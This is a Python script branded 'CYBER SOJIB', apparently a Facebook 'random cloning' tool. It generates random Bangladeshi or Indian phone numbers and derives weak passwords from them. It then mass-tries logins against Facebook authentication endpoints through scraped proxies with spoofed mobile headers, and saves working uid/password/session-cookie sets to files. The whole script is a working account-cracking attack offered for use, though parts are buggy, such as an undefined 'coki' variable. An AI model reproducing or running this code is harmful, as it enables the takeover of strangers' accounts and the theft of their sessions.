#!/usr/bin/python3
'''
 </> ---------------------------------------------
 </> Released By : CYBER SOJIB
 </> ---------------------------------------------
 </> SEND by ->  CYBER SOJIB 
 </> Project -> RANDOM V2 
 </> Updated On -> 17 APRIL 2025
 </> Group -> https://www.facebook.com/share/g/16D3cqzNZX/
 </> GitHub -> https://github.com/Cybersojib12
 </> ---------------------------------------------
'''
#~~~~~~~~\>MODULE</~~~~~~~~#
import os,time,random,string,sys,uuid,requests,json
from os import system
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#---------------------[ CYBER SOJIB COLORS ]---------------------#

red = "\x1b[38;5;196m"
green = "\x1b[38;5;46m"
blue = "\x1b[38;5;21m"
yellow = "\x1b[38;5;226m"
cyan = "\x1b[38;5;51m"
meganta = "\x1b[38;5;201m"
white = "\x1b[38;5;231m"
orange = "\x1b[38;5;214m"
pink = "\x1b[38;5;205m"
lime = "\x1b[38;5;154m"
purple = "\x1b[38;5;93m"

a="\033[1;30m";r="\033[1;31m";g="\033[1;32m"
y="\033[1;33m";b="\033[1;34m";p="\033[1;35m"
c="\033[1;36m";w="\033[1;37m";bgr="\033[41m"
stp="\033[1;0m";itl="\033[1;3m";unl="\033[1;4m"

#---------------------[ CYBER SOJIB STYLE ]---------------------#

aruXsx = f" {lime}<{pink}/{lime}>{pink}"
aruXs1 = f" {lime}<{pink}1{lime}>{pink}"
aruXs2 = f" {lime}<{pink}2{lime}>{pink}"
aruXs3 = f" {lime}<{pink}3{lime}>{pink}"
aruXs0 = f" {lime}<{pink}0{lime}>{pink}"
aruXsz = f" {lime}<{pink}?{lime}>{pink}"
#~~~~~~~~\>PROXY</~~~~~~~~#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('Proksi.txt','w').write(prox)
except Exception as e:
	print(e)
#~~~~~~~~\>CLEAR</~~~~~~~~#
def __clear__():
	system("clear")
	print(logo)
#~~~~~~~~\>LINE</~~~~~~~~#
def __line__():
	print(f'''{green}{50*'-'}''')
#---------------------[ THE X KILLER  LOGO ]---------------------#

logo = f"""
                 
                        
                           
                           
                           
                           
                           
                           
                           
                           
                           
                           
                             
                           
                        WELLCOME TO VOID X RAVEN TOOL"""
#~~~~~~~~\>SELF</~~~~~~~~#
class __CYBERSOJIB__:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.nvs = []
        self.cps = []
        self.gen = []
        self.nen = []
#~~~~~~~~\>MAIN-MENU</~~~~~~~~#
    def __MENU__(self):
    	__clear__()
    	print(f"{green}1.{red}R{green}A{blue}N{cyan}D{white}O{orange}M {lime}C{meganta}L{pink}O{purple}N{cyan}E ")
    	print(f"{red}2. {green}E{cyan}X{red}I{purple}T {red}T{blue}O{white}O{pink}L ")
    	__line__()
    	__MECO__ = input(f"{red}<{white}/{red}>{cyan} INPUT MENU {white} ")
    	if __MECO__ == "1":
    	    self.__CODECH__()
    	if __MECO__ == "0":
    	    __line__();print(f"{green} SUCCESSFULLY EXIT DONE.....!");time.sleep(1)
    	if __MECO__ not in ["1","0"]:
        	__line__();print(f"{green} INVALID OPTION TRY AGAIN......!");time.sleep(1);self.__MENU__()
#~~~~~~~~\>RANDOM-AUTO</~~~~~~~~#
    def __CODECH__(self):
    	__clear__()
    	print(f"{red}1. {green}A{blue}U{white}T{meganta}O {red}C{yellow}O{green}D{pink}E   {green}>[{white}B{green}D{red}-{blue}O{lime}N{orange}L{red}Y{green}]< ")
    	print(f"2.{yellow} {red}C{green}U{yellow}S{blue}T{pink}O{white}M{orange}C{red}O{pink}D{blue}E {green}>[{white}OTHER-S{green}]< ")
    	print(f"3.{blue} {cyan}B{red}A{green}C{yellow}K {red}M{green}E{pink}N{blue}U ")
    	__line__()
    	__MECO__ = input(f"{red}<{white}/{red} {cyan} INPUT MENU {white} ")
    	if __MECO__ == "1":
    	    self.__AUTOX__()
    	if __MECO__ == "2":
    	    self.__MENUR__()
    	if __MECO__ == "0":
    	    self.__MENU__()
    	if __MECO__ not in ["1","2","0"]:
        	__line__();print(f"{green} INVALID {red}OPTION{blue} TRY{cyan} AGAIN{green}......{white}!");time.sleep(1);self.__CODECH__()
#~~~~~~~~\>RANDOM-AUTO</~~~~~~~~#
    def __AUTOX__(self):
    	__clear__()
    	print(f"{green} EXAMPLE    {white} 500 {green}/{cyan} 10000 {green}/{purple} 20000 {green}/{red} 9999 ")
    	__line__()
    	__limit__ = int(input(f"{red}<{white}/{red}>{cyan} INPUT LIMI1T {white} "))
    	__clear__()
    	print(f"{red} METHOD-1 {white} {green}>[{white}B-API{green}]<{white}\n{yellow} METHOD-2 {white} {green}>[{white}GRAPH{green}]<{white}")
    	__line__()
    	__method__ = input(f"{red}<{white}/{red}>{cyan} {green}INPUT {red}METHOD {white} ")
    	for x in range(__limit__):
    	    prefix = random.choice(["013","014","015","016","017","018","019"])
    	    nmp = ''.join(random.choice(string.digits) for _ in range(8))
    	    nmpd = prefix + nmp
    	    self.gen.append(nmpd)
    	with ThreadPool(max_workers=30) as __RANDOM__:
    	    __clear__()
    	    print(f"{green} CODE{green}/{white}LIMIT {white} AUTO{green}/{white}{__limit__} ")
    	    print(f"{green} IF NO RESULT ON{green}/{white}OFF AIRPLANE MODE.....! ")
    	    __line__()
    	    for ids in self.gen:
    	        passlist = [ids,ids[:8],ids[:7],ids[:6],ids,ids[1:],ids[2:]]
    	        if __method__ == "1":
    	            __RANDOM__.submit(self.__M1X__,ids,passlist)
    	        if __method__ == "2":
    	            __RANDOM__.submit(self.__M2X__,ids,passlist)
    	        if __method__ not in ["1","2"]:
    	            __RANDOM__.submit(self.__M1X__,ids,passlist)
    	print("\033[1;37m")
    	__line__()
    	print(f"{green} THE PROCESS HAS COMPLETED...!")
    	print(f"{green} TOTAL OK{green}/{white}CP {white}{blue} "+str(len(self.oks))+f"{green}/{yellow}"+str(len(self.cps)))
    	__line__()
    	print(f"{green} THANKS FOR USING.....! ")
#~~~~~~~~\>RANDOM-COUNTRY</~~~~~~~~#
    def __MENUR__(self):
    	__clear__()
    	print(f" {cyan}1.{red} BANGLADESH CLONING ")
    	print(f" {blue}2. {yellow} INDIA CLONING ")
    	print(f" {red}X.  {blue} BACK MENU ")
    	__line__()
    	__MECO__ = input(f"{red}<{white}/{red}>{cyan} INPUT{green} MENU {white} ")
    	if __MECO__ == "1":
    	    self.nen.append("1");self.__RANDOMM__()
    	if __MECO__ == "2":
    	    self.nen.append("2");self.__RANDOMM__()
    	if __MECO__ == "0":
    	    self.__CODECH__()
    	if __MECO__ not in ["1","2","0"]:
        	__line__();print(f"{green} INVALID OPTION TRY AGAIN......!");time.sleep(1);self.__MENUR__()
#~~~~~~~~\>RANDOM-MANUAL</~~~~~~~~#
    def __RANDOMM__(self):
    	__clear__()
    	if "1" in self.nen:
        	print(f"{green} EXAMPLE    {white} 016 {green}/{white} 017 {green}/{white} 018 {green}/{white} 019")
    	if "2" in self.nen:
        	print(f"{green} EXAMPLE    {white} +91639 {green}/{white} +91687 {green}/{white} +91612 ")
    	__line__()
    	__code__ = input(f"{cyan} INPUT SIM CODE {white} ")
    	__clear__()
    	print(f"{green} EXAMPLE    {white} 6666 {green}/{white} 7777 {green}/{white} 8888 {green}/{white} 9999 ")
    	__line__()
    	__limit__ = int(input(f"{red}<{white}/{red}> {cyan} INPUT LIMIT {white} "))
    	__clear__()
    	print(f"{red} METHOD-1 {white} {green}>[{white}B-API{green}]<{white}\n{yellow} METHOD-2 {white} {green}>[{white}GRAPH{green}]<{white}")
    	__line__()
    	__method__ = input(f"{red}<{white}/{red}>{cyan} INPUT METHOD {white} ")
    	for x in range(__limit__):
    	    if "1" in self.nen:
    	        nmp = ''.join(random.choice(string.digits) for _ in range(8))
    	        self.gen.append(nmp)
    	    if "2" in self.nen:
    	        nmp = ''.join(random.choice(string.digits) for _ in range(6))
    	        self.gen.append(nmp)
    	with ThreadPool(max_workers=30) as __RANDOM__:
    	    __clear__()
    	    print(f"{green} CODE{green}/{white}LIMIT {white} {__code__}{green}/{white}{__limit__} ")
    	    print(f"{green} IF NO RESULT ON{green}/{white}OFF AIRPLANE MODE.....! ")
    	    __line__()
    	    for love in self.gen:
    	        ids = __code__ + love
    	        if "1" in self.nen:
    	            passlist = [ids,ids[:8],ids[:7],ids[:6],love,love[1:],love[2:]]
    	        if "2" in self.nen:
    	            passlist = ["57575751","57273200","59039200",ids[4:],ids[3:]]
    	        if __method__ == "1":
    	            __RANDOM__.submit(self.__M1X__,ids,passlist)
    	        if __method__ == "2":
    	            __RANDOM__.submit(self.__M2X__,ids,passlist)
    	        if __method__ not in ["1","2"]:
    	            __RANDOM__.submit(self.__M1X__,ids,passlist)
    	print("\033[1;37m")
    	__line__()
    	print(f"{green} THE PROCESS HAS COMPLETED...!")
    	print(f"{green} TOTAL OK{green}/{white}CP {white}{blue} "+str(len(self.oks))+f"{green}/{yellow}"+str(len(self.cps)))
    	__line__()
    	print(f"{green} THANKS FOR USING.....! ")
#~~~~~~~~\>RANDOM-M1</~~~~~~~~#
    def __M1X__(self,ids,passlist):
    	global loop,oks,cps,prox
    	color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    	sys.stdout.write(f'\r{green}{white}-{green}>[{blue}{color}CYBER SOJIB-R1{green}]<{white}-{green}>[{color}{self.loop}{green}]<{white}-{green}>[{blue}{len(self.oks)}{green}/{lime}{len(self.nvs)}{green}/{red}{len(self.cps)}{green}]< ')
    	sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                xx = open('Proksi.txt','r').read().splitlines()
                zz = {'http': 'socks4://'+random.choice(xx)}
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {
                'adid':adid,
                'format':'json',
                'device_id':device_id,
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                 'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_GB',
                'client_country_code':'GB',
                'fb_api_req_friendly_name':'authenticate',
                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
                'access_token':f'{accessToken}'}
                headers = {
                'User-Agent':self.__UPR__(),
                'Accept-Encoding':'gzip, deflate',
                'Connection':'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host':'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'Authorization':f'OAuth {accessToken}',
                'X-FB-Connection-Type':'WIFI',
                'X-Tigon-Is-Retry':'False',
                'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group':'5120',
                'X-FB-Friendly-Name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags':'graphservice',
                'X-FB-HTTP-Engine':'Liger',
                'X-FB-Client-IP':'True',
                'X-FB-Server-Cluster':'True',
                'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                url = 'https://b-api.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers,proxies=zz).json()
                if "session_key" in po:
                    uid = str(po["uid"])
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    response = str(requests.get(f"https://shajon404.pythonanywhere.com/live?uid={uid}").text)
                    if response == 'live':
                        print(f"\r{green}{white}-{green}>[{blue}CYBER SOJIB-OK{green}]<{blue} {uid} {green}/{blue} {pas}")
                        print(f"\r{green}{white}-{green}>[{blue}COKIE-X{green}]<{purple} "+coki)
                        __line__()
                        open('/sdcard/CYBER SOJIB-M1-OK.txt','a').write(uid+'/'+pas+'/'+coki+'\n')
                        self.oks.append(uid)
                        break
                    if response == 'dead':
                        print(f"\r{green}{white}-{green}>[{orange}CYBER SOJIB-LK{green}]<{orange} {uid} {green}/{orange} {pas}")
                        open('/sdcard/CYBER SOJIB-M1-LK.txt','a').write(uid+'/'+pas+'\n')
                        break
                    if "-1:-1" in cookies:
                        print(f"\r{green}{white}-{green}>[{lime}CYBER SOJIB-NV{green}]<{lime} {uid} {green}/{blue} {pas}")
                        print(f"\r{green}{white}-{green}>[{lime}COKIE-X{green}]<{purple} "+coki)
                        __line__()
                        open('/sdcard/CYBER SOJIB-M1-NV.txt','a').write(uid+'/'+pas+'/'+coki+'\n')
                        self.nvs.append(uid)
                        break
                if 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    print(f"\r{green}{white}-{green}>[{red}CYBER SOJIB-CP{green}]<{red} {uid} {green}/{red} {pas}")
                    open('/sdcard/CYBER SOJIB-M1-CP.txt','a').write(uid+'/'+pas+'\n')
                    self.cps.append(uid)
                    break
                else:continue
            self.loop += 1
    	except Exception as e:
            pass
#~~~~~~~~\>RANDOM-M2</~~~~~~~~#
    def __M2X__(self,ids,passlist):
    	global loop,oks,cps,prox
    	color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    	sys.stdout.write(f'\r{green}{white}-{green}>[{blue}{color}CYBER SOJIB-R2{green}]<{white}-{green}>[{color}{self.loop}{green}]<{white}-{green}>[{blue}{len(self.oks)}{green}/{lime}{len(self.nvs)}{green}/{red}{len(self.cps)}{green}]< ')
    	sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                xx = open('Proksi.txt','r').read().splitlines()
                zz = {'http': 'socks4://'+random.choice(xx)}
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': ids,
                'password': pas,
                'access_token': accessToken,
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'}
                headers = {
                'User-Agent': self.__UPR__(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                url = 'https://graph.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers,proxies=zz).json()
                if "session_key" in po:
                    uid = str(po["uid"])
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    response = str(requests.get(f"https://shajon404.pythonanywhere.com/live?uid={uid}").text)
                    if response == 'live':
                        print(f"\r{green}{white}-{green}>[{blue}CYBER SOJIB-OK{green}]<{blue} {uid} {green}/{blue} {pas}")
                        print(f"\r{green}{white}-{green}>[{blue}COKIE-X{green}]<{purple} "+coki)
                        __line__()
                        open('/sdcard/CYBER SOJIB-M2-OK.txt','a').write(uid+'/'+pas+'/'+coki+'\n')
                        self.oks.append(uid)
                        break
                    if response == 'dead':
                        print(f"\r{green}{white}-{green}>[{orange}CYBER SOJIB-LK{green}]<{orange} {uid} {green}/{orange} {pas}")
                        open('/sdcard/CYBER SOJIB-M2-LK.txt','a').write(uid+'/'+pas+'\n')
                        break
                    if "-1:-1" in cookies:
                        print(f"\r{green}{white}-{green}>[{lime}CYBER SOJIB-NV{green}]<{lime} {uid} {green}/{blue} {pas}")
                        print(f"\r{green}{white}-{green}>[{lime}COKIE-X{green}]<{purple} "+coki)
                        __line__()
                        open('/sdcard/CYBER SOJIB-M2-NV.txt','a').write(uid+'/'+pas+'/'+coki+'\n')
                        self.nvs.append(uid)
                        break
                if 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    print(f"\r{green}{white}-{green}>[{red}CYBER SOJIB-CP{green}]<{red} {uid} {green}/{red} {pas}")
                    open('/sdcard/CYBER SOJIB-M2-CP.txt','a').write(uid+'/'+pas+'\n')
                    self.cps.append(uid)
                    break
                else:continue
            self.loop += 1
    	except Exception as e:
            pass
#~~~~~~~~\>UA</~~~~~~~~#
    def __UPR__(self):
    	ua1 = "[FBAN/FB4A;FBAV/339.0.0.32.118;FBBV/323006995;FBDM/{density=2.0,width=720,height=1369};FBLC/en_GB;FBRV/325030047;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    	ua2 = "[FBAN/FB4A;FBAV/309.0.0.3.179;FBBV/482983480;FBDM/{density=3.5,width=1080,height=1491};FBLC/en_GB;FBRV/0;FBCR/TNT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
    	ua3 = "[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672900;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/0;FBCR/YOTA;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo Z90a40;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    	ua4 = "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=3.0,width=1080,height=2224};FBLC/en_GB;FBRV/335247818;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STK-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    	ua5 = "[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245028;FBDM/{density=3.0,width=1080,height=2090};FBLC/en_GB;FBRV/268119191;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/JNY-LX1;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    	__uaxx__ = random.choice([ua1,ua2,ua3,ua4,ua5])
    	__max__ = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{__uaxx__}'
    	return str(__max__)
#~~~~~~~~\>LAST-CALL</~~~~~~~~#
if __name__ == "__main__":
    __CYBERSOJIB__().__MENU__()
#~~~~~~~~\>END-CALL</~~~~~~~~#